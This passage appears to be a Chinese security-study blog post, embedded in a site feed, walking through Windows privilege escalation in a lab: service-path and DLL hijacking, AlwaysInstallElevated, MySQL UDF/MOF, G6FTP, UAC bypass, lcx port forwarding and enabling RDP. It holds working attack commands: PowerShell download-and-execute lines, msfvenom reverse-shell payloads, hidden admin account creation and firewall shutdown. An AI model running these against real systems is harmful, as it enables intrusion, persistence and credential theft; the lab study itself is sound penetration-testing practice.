exploit/windows/local/service_permissions</p><p>开启监听监听模块</p><p>我们运行刚才的后门，返回一个session</p><p>getuid发现权限比较低，是iis权限</p><p><img src="/2021/12/28/day37/image-20220301114037670.png" alt="image-20220301114037670"></p><p>我们运行此攻击模块，set session为此session号，run即可</p><p>运行后他会自动替换并执行</p><p><img src="/2021/12/28/day37/image-20220301114433661.png" alt="image-20220301114433661"></p><p>看到拿到了另一个session</p><p>getuid后权限为系统权限</p><h3 id="不带引号的服务路径提权"><a href="#不带引号的服务路径提权" class="headerlink" title="不带引号的服务路径提权"></a>不带引号的服务路径提权</h3><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。</p><p>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p><p>如下</p><p>没有双引号时候windows会把空格前面当作exe执行</p><p><img src="/2021/12/28/day37/image-20220228150745069.png" alt="image-20220228150745069"></p><h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>我们使用PrivescCheck此脚本会遍历出带有空格的文件</p><pre class="line-numbers language-none"><code class="language-none">powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.134/PrivescCheck.ps1'); Invoke-PrivescCheck"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用命令</p><pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:Windows" |findstr/i /v """<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220228152445912.png" alt="image-20220228152445912"></p><p>看见存在空格且路径是可写的，可能就存在空格</p><p>如果C盘可写上传反弹后门到C:\Program.exe即可</p><p>系统在重启 获取管理员重启该服务的时候就会获取系统权限</p><pre class="line-numbers language-none"><code class="language-none">set AutoRunScript migrate -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时设置自动迁移进程，防止断开</p><h3 id="注册键AlwaysInstallElevated"><a href="#注册键AlwaysInstallElevated" class="headerlink" title="注册键AlwaysInstallElevated"></a>注册键AlwaysInstallElevated</h3><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NTAuthority\System权限来安装恶意的MSI文件。 </p><p>windows install是windows操作系统的组件之一，专门用来管理配置软件服务。它除了是一个安装程序，还用于管理软件的安装、组件的添加、删除、监视文件的还原、通过回滚进行灾难恢复。</p><p>windows install通过msiexec.exe安装MSI文件，双击MSI文件就会运行msiexec.exe。 原理:是因为用户打开了windows installer 特权安装功能</p><h4 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h4><p>运行gpedit.msc，如下操作</p><p><img src="/2021/12/28/day37/image-20220301123150381.png" alt="image-20220301123150381"></p><p>使用PowerUp检测注册表是否有设置，如果返回true证明可以利用</p><pre class="line-numbers language-none"><code class="language-none">PowerShell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://192.168.80.134/PowerUp.ps1'); Get-RegAlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是iis_user用户权限较低，返回false</p><p><img src="/2021/12/28/day37/image-20220301123615054.png" alt="image-20220301123615054"></p><p>以use用户权限运行返回true</p><p><img src="/2021/12/28/day37/image-20220301123729695.png" alt="image-20220301123729695"></p><p>上传 COMahawk64.exe并执行可返回一个账号密码</p><pre class="line-numbers language-none"><code class="language-none">C:\ProgramData\COMahawk64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220301123942601.png" alt="image-20220301123942601"></p><p>可以看到账号在管理员组里面</p><p><img src="/2021/12/28/day37/image-20220301124023071.png" alt="image-20220301124023071"></p><h3 id="本地dll劫持提权"><a href="#本地dll劫持提权" class="headerlink" title="本地dll劫持提权"></a>本地dll劫持提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Windows程序启动的时候需要DLL。如果DLL 不存在，可以通过在应用程序要查找的位置放置恶意DLL来提权。</p><p>通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><ol><li>应用程序加载的目录 </li><li>C:\Windows\System32 </li><li>C:\Windows\System </li><li>C:\Windows </li><li>当前工作目录Current Working Directory，CWD </li><li>在PATH环境变量的目录（先系统后用户）</li></ol><p>这样的加载顺序很容易导致一个系统dll被劫持，因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载。</p><h4 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h4><p>程序运行一般会加载系统dll或本身程序自带的dll，我们将程序执行时需要加载的dll文件替换成木马程序，那么我们下次在启动程序时所加载的dll就是我们替换的那个木马程序了。</p><p>收集进程加载的dll-&gt;制作dll木马并上传-&gt;替换dll-&gt;启动应用后成功</p><p><strong>收集进程加载的dll</strong></p><p>使用火绒剑分析进程执行时加载了那些dll</p><p><img src="/2021/12/28/day37/image-20220301133415247.png" alt="image-20220301133415247"></p><p>一般情况系统文件系统文件无法更改，我们目标在位置文件或数字签名文件</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=12345 -f dll &gt; libcurl_x86.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将生成的dll替换原本路径下的dll</p><p><img src="/2021/12/28/day37/image-20220301133502324.png" alt="image-20220301133502324"></p><p>打开msf监听，注意设置payload</p><p><img src="/2021/12/28/day37/image-20220301133210801.png" alt="image-20220301133210801"></p><h3 id="自动安装配置文件提权"><a href="#自动安装配置文件提权" class="headerlink" title="自动安装配置文件提权"></a>自动安装配置文件提权</h3><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>网络管理员在内网中给多台机器配置同一个环境的时候，一般会使用脚本进行批量部署，也就是会使用安装配置文件，这些文件中包含所有的安装配置信息，其中还有一些包含着本地管理员账号和密码。</p><h4 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h4><p>我们可搜索Unattend.xml文件</p><pre class="line-numbers language-none"><code class="language-none">dir /b /s c:\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220301134351947.png" alt="image-20220301134351947"></p><p>或者使用msf 的post/windows/gather/enum_unattend模块对配置文件扫描</p><p><img src="/2021/12/28/day37/image-20220301134615760.png" alt="image-20220301134615760"></p><h2 id="第三方组件提权"><a href="#第三方组件提权" class="headerlink" title="第三方组件提权"></a>第三方组件提权</h2><p>做提权时，如果发现webshell的cmd无法执行命令，并且没有任何可上传目录，我们可以看看目标有无一些第三方服务</p><p>利用portscan</p><p><img src="/2021/12/28/day37/image-20220301150539426.png" alt="image-20220301150539426"></p><h3 id="sqlserver提权"><a href="#sqlserver提权" class="headerlink" title="sqlserver提权"></a>sqlserver提权</h3><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>如果网站里面使用的数据库是sqlserver，那么如果找到sa的密码，利用提权脚本，执行命令。</p><p>但是不一定的系统权限，还要看管理员开始安装sqlserver的权限设置，一般情况是system权限或者pulic，均能执行命令</p><p>敏感文件</p><pre class="line-numbers language-none"><code class="language-none">web.config config.asp conn.aspx database.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h4><p>使用mssql连接工具或者webshell net提权脚本输入账号和密码连接</p><p><img src="/2021/12/28/day37/image-20220301150845580.png" alt="image-20220301150845580"></p><p>开启cmd</p><p><img src="/2021/12/28/day37/image-20220301151358307.png" alt="image-20220301151358307"></p><p>开启之后，看是否可以执行命令</p><p><img src="/2021/12/28/day37/image-20220301151512693.png" alt="image-20220301151512693"></p><p>查看权限，可以看到权限比较低，是一个数据库权限</p><p><img src="/2021/12/28/day37/image-20220301151607813.png" alt="image-20220301151607813"></p><p>数据库权限的话，增加账号应该是不够的</p><p>可以上传溢出工具来提高权限</p><h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>在mysql 可以使用自定义函数进行提权，udf = user defined function 用户自定义函数。</p><p>对于自定义的函数，在mysql5.1版本以后就需要放在插件插件目录 /lib/plugin ,文件后缀为dll，c语言编写。</p><h4 id="mysql提权难点"><a href="#mysql提权难点" class="headerlink" title="mysql提权难点"></a>mysql提权难点</h4><ol><li><p>版本有32 和64位的mysql。创建函数的方法一样，但是64版本的要用64的udf.dll</p></li><li><p>The MySQL server is running with the –secure-file-priv option so it cannot execute this statement</p><p>这种是mysql默认设置是不允许导入导出，需要在my.ini添加 </p><pre class="line-numbers language-none"><code class="language-none">secure-file-priv = <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保存重启mysql即可</p><p>可以用以下命令查看此配置信息</p><pre class="line-numbers language-none"><code class="language-none">SELECT @@global.secure_file_priv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>Can’t create/write to file ‘D:\phpStudy\MySQL\lib\plugin\moonudf.dll</p><p>这种是没有权限导出或者plugin目录不存在，需要手动创建。</p><p>使用此语句可查询插件目录是否存在</p><pre class="line-numbers language-none"><code class="language-none">show variables like "%plugin%"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h4><p>在网站上寻找mysql服务的账号密码</p><p>然后上传提权脚本到网站目录</p><p><img src="/2021/12/28/day37/image-20220301160242522.png" alt="image-20220301160242522"></p><p><img src="/2021/12/28/day37/image-20220301160502097.png" alt="image-20220301160502097"></p><p>登陆后导出udf</p><p><img src="/2021/12/28/day37/image-20220301160515708.png" alt="image-20220301160515708"></p><p>导出成功后创建udf函数</p><p><img src="/2021/12/28/day37/image-20220301174218028.png" alt="image-20220301174218028"></p><p>之后可以执行一些命令</p><p><img src="/2021/12/28/day37/image-20220301174314462.png" alt="image-20220301174314462"></p><p>超级管理员</p><p><img src="/2021/12/28/day37/image-20220301174708939.png" alt="image-20220301174708939"></p><p><img src="/2021/12/28/day37/image-20220301174804024.png" alt="image-20220301174804024"></p><h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>mof多用于权限维持</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>mof是windows系统的一个文件（c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。</p><p>作用是有了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><p><strong>条件：</strong></p><ol><li>windows 03及以下版本</li><li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li><li>secure-file-priv参数不为null</li></ol><h4 id="复现-11"><a href="#复现-11" class="headerlink" title="复现"></a>复现</h4><p>把mof.php上传到网站目录，填写命令执行</p><p><img src="/2021/12/28/day37/image-20220302123836661.png" alt="image-20220302123836661"></p><pre class="line-numbers language-none"><code class="language-none">net.exe user xiaosha$ 123456 /add &amp;&amp; net localgroup administrators xiaosha /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220302124131278.png" alt="image-20220302124131278"></p><p>靶机看确实加到管理员组了</p><p><img src="/2021/12/28/day37/image-20220302124151211.png" alt="image-20220302124151211"></p><h3 id="G6FTP-提权"><a href="#G6FTP-提权" class="headerlink" title="G6FTP 提权"></a>G6FTP 提权</h3><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p> G6FTP的默认端口为8021，只侦听在127.0.0.1的8021端口上，无法从外部直接访问，所以需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</p><p>netstat -ano 查看G6ftp端口</p><p><img src="/2021/12/28/day37/image-20220302133656605.png" alt="image-20220302133656605"></p><h4 id="复现-12"><a href="#复现-12" class="headerlink" title="复现"></a>复现</h4><p>可在webshell访问此目录，remote.ini存放ftp管理员的账号和密码</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files (x86)\Gene6 FTP Server\RemoteAdmin\Remote.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220302134622585.png" alt="image-20220302134622585"></p><p>看出是md5格式</p><p>需要使用端口转发工具将8021转发出来，将icx.exe上传并执行如下</p><pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 2333 127.0.0.1 8021<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220302134806365.png" alt="image-20220302134806365"></p><p><img src="/2021/12/28/day37/image-20220302134844559.png" alt="image-20220302134844559"></p><p>可在靶机上查看是否被转发，看到2333外部可访问</p><p><img src="/2021/12/28/day37/image-20220302135019392.png" alt="image-20220302135019392"></p><p>安装g6ftp可连接服务端进行设置</p><p><img src="/2021/12/28/day37/image-20220302135246199.png" alt="image-20220302135246199"></p><p>可在域中新建用户，并增加命令，全选权限</p><pre class="line-numbers language-none"><code class="language-none">net user xiaosha 123456 /add &amp;&amp; net localgroup administrators xiaosha /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220302140052194.png" alt="image-20220302140052194"></p><p>新建之后可以ftp访问</p><p><img src="/2021/12/28/day37/image-20220302140106489.png" alt="image-20220302140106489"></p><p>登录进来后，我们可以尝试执行刚才设置的命令</p><pre class="line-numbers language-none"><code class="language-none">quote stie ADD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有执行成功，这里提权没出来，因为版本是08server</p><p><img src="/2021/12/28/day37/image-20220302140640408.png" alt="image-20220302140640408"></p><p>这里我们使用另一个思路，windows的系统配置错误，上传Program.exe，系统重启自动启用</p><p>ftp连接成功，登录建立的用户可访问到c盘</p><p><img src="/2021/12/28/day37/image-20220302141615220.png" alt="image-20220302141615220"></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=12345 -f exe &gt; 1.exe <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改名Program.exe，上传，监听，重启</p><p>可上传到启动项</p><p><img src="/2021/12/28/day37/image-20220302142946617.png" alt="image-20220302142946617"></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启后</p><p><img src="/2021/12/28/day37/image-20220302143157724.png" alt="image-20220302143157724"></p><h2 id="bypass-uac"><a href="#bypass-uac" class="headerlink" title="bypass uac"></a>bypass uac</h2><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a><strong>描述</strong></h4><p>UAC（UserAccount Control，用户账户控制）简言之就是在Vista及更高版本中通过弹框进一步让用户确认是否授权当前可执行文件来达到阻止恶意程序的目的。</p><p>比如</p><p><img src="/2021/12/28/day37/image-20220302145327415.png" alt="image-20220302145327415"></p><p>为了远程执行目标的exe或者bat可执行文件绕过此安全机制，因此叫BypassUAC（不进行弹窗直接运行执行文件）</p><h4 id="复现-13"><a href="#复现-13" class="headerlink" title="复现"></a><strong>复现</strong></h4><p>把msf生成的反向链接exe放到win10，监听，执行</p><p><img src="/2021/12/28/day37/image-20220302145653608.png" alt="image-20220302145653608"></p><p>可以看到在进行getsystem时出错了，这是uac起了作用</p><p>可以通过search uac 搜索出uac模块</p><p><img src="/2021/12/28/day37/image-20220302145930966.png" alt="image-20220302145930966"></p><p>如果失败可尝试多个模块</p><p><strong>使用bypassuac_injection模块进行bypass</strong></p><blockquote><p>exploit/windows/local/bypassuac_injection</p><p>此模块将利用受信任的通过进程注入发布者证书。它将产生一个关闭UAC标志的第二个shell。此模块使用反射DLL注入技术，仅丢弃DLL有效负载二进制文件，而不是标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构x64（也适用于SYSWOW64系统）。如果指定EXE:：自定义DLL应在单独启动有效负载后调用ExitProcess（）</p></blockquote><p>成功bypass掉uac，但是这里hashdump仍然失败，看了下应该是x86的问题</p><p><img src="/2021/12/28/day37/image-20220302150402520.png" alt="image-20220302150402520"></p><p>这里需要迁移进程到x64</p><p>ps列出进程 migrate 迁移</p><p><img src="/2021/12/28/day37/image-20220302151516439.png" alt="image-20220302151516439"></p><p>成功 hashdump</p><h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h2><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a><strong>描述</strong></h4><p>lcx是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网IP）任意端口。它是一款命令行工具，当然也可以在有权限的webshell下执行，正因如此lcx常被认为是一款黑客入侵工具，lcx在内网入侵渗透中起着重要的角色。</p><p>lcx进行端口转发的原理就是使不同端口之间形成一个回路。它常用于外网连接内网3389端口。</p><h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><p>本地转发主要是把127.0.0.1:端口 这个本地端口 转发到外部 让外部的客户端允许连接进来</p><p>我们在G6FTP使用过此方法，把本地8021转发到2333端口</p><p><img src="/2021/12/28/day37/image-20220302155334172.png" alt="image-20220302155334172"></p><h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><p>远程转发 一般用于外网无法访问内网，内网可以访问外网，由内部发出请求到外网，所以防火墙不会拦截。</p><p>客户端除了可以在本地访问内网机子，也可以作为中间人，外部机子也能连接客户端到内网服务端。</p><p><img src="/2021/12/28/day37/image-20220302182525073.png" alt="image-20220302182525073"></p><p>让不同端口之间形成一个回路，51-&gt;2333-&gt;3389</p><p>客户端监听</p><pre class="line-numbers language-none"><code class="language-none">lcx -listen 51 2333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220302182757993.png" alt="image-20220302182757993"></p><p>服务端执行转发</p><pre class="line-numbers language-none"><code class="language-none">/c C:\inetpub\wwwroot\lcx.exe -slave 192.168.80.138 2333 127.0.0.1 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220302182817164.png" alt="image-20220302182817164"></p><p>客户端然后用mstsc连接</p><p><img src="/2021/12/28/day37/image-20220302190126452.png" alt="image-20220302190126452"></p><h2 id="远程终端问题"><a href="#远程终端问题" class="headerlink" title="远程终端问题"></a>远程终端问题</h2><p>远程终端的默认端口是3389，云vps一般会开启，没有启用的情况下，在较高的权限下可以使用注册表命令进行开启。</p><p>端口是否开启，服务是否开启，防火墙是否开启，ipsec是否开启. . .等，都影响远程终端连接。</p><h3 id="注册表开启远程终端命令"><a href="#注册表开启远程终端命令" class="headerlink" title="注册表开启远程终端命令"></a>注册表开启远程终端命令</h3><h4 id="2008-2012-2016-开启3389"><a href="#2008-2012-2016-开启3389" class="headerlink" title="2008 2012 2016 开启3389"></a>2008 2012 2016 开启3389</h4><p>1.bat</p><pre class="line-numbers language-none"><code class="language-none">echo DO ALL IN CMD! reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v PortNumber /t REG_DWORD /d 3389 /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行后开启3389</p><h4 id="MSF命令开启3389"><a href="#MSF命令开启3389" class="headerlink" title="MSF命令开启3389"></a>MSF命令开启3389</h4><p>需要管理员权限</p><pre class="line-numbers language-none"><code class="language-none">run getgui -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="一条命令开启3389"><a href="#一条命令开启3389" class="headerlink" title="一条命令开启3389"></a>一条命令开启3389</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="WMIC命令开启3389端口"><a href="#WMIC命令开启3389端口" class="headerlink" title="WMIC命令开启3389端口"></a>WMIC命令开启3389端口</h4><p>前提条件是确保“Windows Management Instrumentation(Winmgmt)”服务已正常启动。</p><pre class="line-numbers language-none"><code class="language-none">wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="WMIC开启-远程主机3389端口"><a href="#WMIC开启-远程主机3389端口" class="headerlink" title="WMIC开启 远程主机3389端口"></a>WMIC开启 远程主机3389端口</h4><p>支持系统：Win2k/XP/Win2k3</p><pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.80.136 /user:administrator /password:123456 PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>支持系统：Win7/Win2k8/Win8.1/Win10/2012/2016</p><pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.80.136 /user:administrator /password:123456 RDTOGGLE WHERE ServerName='08serverR2-1' call SetAllowTSConnections 1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.80.136 /user:administrator /password:123456 process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><p>利用WMIC远程执行命令的方式来执行WMIC、REG等开启3389端口的命令。</p><p>WMIC远程开启3389端口时不能用%COMPUTERNAME%环境变量替代远程主机的计算机名。错误：描述 = 拒绝访问，这是因为开启了UAC用户账户控制，只允许RID500管理员执行此操作。</p><h4 id="查询是否开启3389（0为On-1为OFF）"><a href="#查询是否开启3389（0为On-1为OFF）" class="headerlink" title="查询是否开启3389（0为On 1为OFF）"></a>查询是否开启3389（0为On 1为OFF）</h4><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注册表查询端口号"><a href="#注册表查询端口号" class="headerlink" title="注册表查询端口号"></a>注册表查询端口号</h4><p><strong>可使用webshell的REGshell</strong></p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220303135759053.png" alt="image-20220303135759053"></p><p><strong>cmdshell查询</strong></p><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds" /s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP- Tcp" /v PortNumber <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将16进制整数输出，即为3389</p><pre class="line-numbers language-none"><code class="language-none">set /a Port=0xd3d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220303140132308.png" alt="image-20220303140132308"></p><p><strong>通过网络命令查询端口</strong></p><pre class="line-numbers language-none"><code class="language-none">tasklist /svc | findstr "TermService" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">netstat -ano | findstr "进程号" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">net start |find "Remote Desktop Services"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1264为进程号</p><p><img src="/2021/12/28/day37/image-20220303140447024.png" alt="image-20220303140447024"></p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>确定开启了远程终端并且端口没错的情况下，还是连不上目标</p><p>这个时候可以使用lcx端口转发或者使用命令关闭防火墙</p><p>查询状态</p><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall show allprofile state<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关闭防火墙</p><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关闭防火墙</p><pre class="line-numbers language-none"><code class="language-none">net stop "Windows Firewall"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>禁用防火墙</p><pre class="line-numbers language-none"><code class="language-none">sc config sharedaccess start= disabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关闭防火墙</p><pre class="line-numbers language-none"><code class="language-none">net stop sharedaccess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="关闭-ipsec"><a href="#关闭-ipsec" class="headerlink" title="关闭 ipsec"></a>关闭 ipsec</h3><p>在关闭防火墙时，还是连接不上，可能是ipsec做了ip策略处理，导致连接失败</p><pre class="line-numbers language-none"><code class="language-none">net stop "IPsec Policy Agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="终端连接错误方法"><a href="#终端连接错误方法" class="headerlink" title="终端连接错误方法"></a>终端连接错误方法</h3><p>08远程开启3选项，win10连接，出现如下</p><p><img src="/2021/12/28/day37/image-20220303141040857.png" alt="image-20220303141040857"></p><p>此情况下，可使用相同版本的终端连接，用12server连接</p><p><img src="/2021/12/28/day37/image-20220303141246931.png" alt="image-20220303141246931"></p><p>或者使用 xfreerdp工具连接会自动加密</p><pre class="line-numbers language-none"><code class="language-none">xfreerdp /f /u:administrator /p:123456 /v:192.168.80.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/28/day37/image-20220303141536969.png" alt="image-20220303141536969"></p><p>注销即可退出</p><h3 id="加入远程桌面组"><a href="#加入远程桌面组" class="headerlink" title="加入远程桌面组"></a>加入远程桌面组</h3><p>在08新建一个普通用户，通过普通用户远程连接</p><p><img src="/2021/12/28/day37/image-20220303142256017.png" alt="image-20220303142256017"></p><pre class="line-numbers language-none"><code class="language-none">net localgroup "Remote Desktop Users" xiaosha /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可把此普通用户加入远程登录组，成功连接，但是权限较低</p><p><img src="/2021/12/28/day37/image-20220303142438794.png" alt="image-20220303142438794"></p><h3 id="终端超出最大连接数"><a href="#终端超出最大连接数" class="headerlink" title="终端超出最大连接数"></a>终端超出最大连接数</h3><p>可用此种方法连接</p><pre class="line-numbers language-none"><code class="language-none">mstsc /v:192.168.80.136:3389 /console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的中间件</title>
      <link href="/2021/12/09/day36/"/>
      <url>/2021/12/09/day36/</url>
      
        <content type="html"><![CDATA[<h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><span id="more"></span><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。 </p><p>中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。</p><p>容器就是中间件 的一种。 </p><p>也就是说，关于中间件，我们可以理解为：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）</p><p>我们经常管web中间件叫做web服务器或者web容器</p><h2 id="常见的web中间件"><a href="#常见的web中间件" class="headerlink" title="常见的web中间件"></a>常见的web中间件</h2><blockquote><p>iis </p><p>apache </p><p>tomcat </p><p>nginx </p><p>jboss </p><p>Weblogic </p><p>WebSphere</p></blockquote><h2 id="iis6x"><a href="#iis6x" class="headerlink" title="iis6x"></a>iis6x</h2><h3 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h3><h4 id="原理"><a 